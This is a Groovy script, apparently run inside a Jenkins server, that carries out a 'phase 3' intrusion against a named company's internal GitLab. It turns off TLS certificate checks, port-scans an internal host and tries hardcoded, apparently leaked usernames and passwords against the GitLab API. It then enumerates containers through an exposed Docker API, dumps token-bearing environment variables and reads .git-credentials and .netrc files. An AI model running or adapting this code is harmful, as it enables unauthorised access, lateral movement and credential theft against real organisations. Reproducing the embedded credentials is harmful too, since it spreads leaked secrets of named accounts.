// PHASE 3: Deeper GitLab access attempts
// 1. Scan more ports on 172.27.140.134
// 2. Try HTTPS on gitlab.dev.claroshop.com (SSL bypass)
// 3. Use Docker API at 172.27.140.148:4243 to find GitLab container
// 4. Look for GitLab API tokens in Jenkins files/env

import javax.net.ssl.*
import java.security.cert.*

def trustAll = { ->
    def ctx = SSLContext.getInstance("TLS")
    ctx.init(null, [new X509TrustManager() {
        void checkClientTrusted(X509Certificate[] c, String a) {}
        void checkServerTrusted(X509Certificate[] c, String a) {}
        X509Certificate[] getAcceptedIssuers() { return new X509Certificate[0] }
    }] as TrustManager[], null)
    return ctx
}
def sslCtx = trustAll()
def noopVerifier = { host, session -> true } as HostnameVerifier

def getUrl(url, headers=[:], timeout=8000) {
    try {
        def conn = new URL(url).openConnection()
        conn.connectTimeout = timeout; conn.readTimeout = timeout + 2000
        if (conn instanceof HttpsURLConnection) {
            conn.sslSocketFactory = sslCtx.socketFactory
            conn.hostnameVerifier = noopVerifier
        }
        conn.setInstanceFollowRedirects(false)
        headers.each { k,v -> conn.setRequestProperty(k, v) }
        def code = conn.responseCode
        def body = ""
        try { body = (code < 400 ? conn.inputStream : conn.errorStream)?.text?:"" } catch(ex) {}
        return [code: code, body: body, headers: conn.headerFields]
    } catch(e) { return [code: 0, body: e.message?.take(100), headers: [:]] }
}

// ===== PART 1: Port scan on 172.27.140.134 =====
println "=== PART 1: PORT SCAN 172.27.140.134 ==="
[80, 443, 8080, 8443, 8929, 3000, 9090, 2222, 10080].each { port ->
    def proto = (port == 443 || port == 8443) ? "https" : "http"
    def r = getUrl("${proto}://172.27.140.134:${port}/api/v4/version", [:], 4000)
    if (r.code > 0) {
        println "  :${port} -> [${r.code}] ${r.body?.take(120)}"
    } else {
        println "  :${port} -> CLOSED/ERR: ${r.body?.take(60)}"
    }
}

// ===== PART 2: Try HTTPS gitlab.dev.claroshop.com =====
println "\n=== PART 2: HTTPS GITLAB ==="
def glBase = "https://gitlab.dev.claroshop.com"
// First check what the redirect points to
def r301 = getUrl("http://gitlab.dev.claroshop.com", [:], 6000)
println "  301 Location: ${r301.headers['Location']}"

def creds = [
    ["jenkins", "e6LBqIkOI\$PR1XX2oia"],
    ["jenkins_legacy", "JenkisLegasy25"],
    ["maria.policarpo", "FtMRl4fDXzIDY4Yj"],
]

creds.each { c ->
    def enc = (c[0]+":"+c[1]).bytes.encodeBase64().toString()
    def r = getUrl(glBase + "/api/v4/user", ["Authorization": "Basic ${enc}"], 8000)
    println "  HTTPS Basic ${c[0]}: [${r.code}] ${r.body?.take(200)}"
    
    // Also try as PRIVATE-TOKEN
    def r2 = getUrl(glBase + "/api/v4/user", ["PRIVATE-TOKEN": c[1]], 8000)
    println "  HTTPS Token ${c[0]}: [${r2.code}] ${r2.body?.take(100)}"
}

// ===== PART 3: Docker API - find GitLab container =====
println "\n=== PART 3: DOCKER API containers ==="
def dockerBase = "http://172.27.140.148:4243"
def rDocker = getUrl(dockerBase + "/containers/json?all=true", [:], 10000)
if (rDocker.code == 200) {
    def body = rDocker.body
    // Find gitlab containers
    def names = []
    (body =~ /"Names":\["([^"]+)"/).each { m -> names << m[1] }
    def images = []
    (body =~ /"Image":"([^"]+)"/).each { m -> images << m[1] }
    def ids = []
    (body =~ /"Id":"([^"]{12})/).each { m -> ids << m[1] }
    
    println "  CONTAINERS FOUND: ${names.size()}"
    [names, images, ids].transpose().each { row ->
        println "  ${row[0]} | image=${row[1]} | id=${row[2]}"
    }
    
    // Look for gitlab/git containers
    def gitlabContainers = []
    (body =~ /"Id":"([^"]+)"[^}]*"Names":\["([^"]+)"\][^}]*"Image":"([^"]+gitlab[^"]*)"/).each { m ->
        gitlabContainers << [id: m[1].take(12), name: m[2], image: m[3]]
    }
    println "  GITLAB CONTAINERS: ${gitlabContainers}"
    
    // Save the full container list for analysis
    println "\n  FULL CONTAINER JSON (first 3000 chars):"
    println body.take(3000)
} else {
    println "  Docker API: [${rDocker.code}] ${rDocker.body?.take(200)}"
}

// ===== PART 4: Jenkins env vars with GitLab token =====
println "\n=== PART 4: JENKINS ENV VARS FOR GITLAB TOKENS ==="
def env = System.getenv()
env.findAll { k, v ->
    k.toLowerCase().contains("gitlab") || k.toLowerCase().contains("token") ||
    k.toLowerCase().contains("git_") || v?.contains("e6LBqIkOI") || v?.contains("JenkisLegasy")
}.each { k, v -> println "  ${k}=${v?.take(100)}" }

// Check /tmp for any cached git credentials
println "\n=== PART 5: CHECK /tmp AND ~jenkins FOR TOKENS ==="
["/tmp", "/var/jenkins_home", "/home/jenkins", "/root"].each { dir ->
    def f = new File(dir)
    if (f.exists()) {
        println "\n  ${dir}:"
        f.listFiles()?.take(20)?.each { ff ->
            println "    ${ff.name}"
            if (ff.name in [".git-credentials", ".netrc", ".gitconfig", "git_credentials"]) {
                println "    CONTENT: ${ff.text.take(500)}"
            }
        }
    }
}

// Check git config
def gitcreds = ["/.git-credentials", "/var/jenkins_home/.git-credentials", "/root/.git-credentials",
                "/home/jenkins/.git-credentials", "/tmp/.git-credentials"]
gitcreds.each { path ->
    def f = new File(path)
    if (f.exists()) println "\nFOUND: ${path}\n${f.text.take(1000)}"
}

println "\n=== DONE PHASE 3 ==="
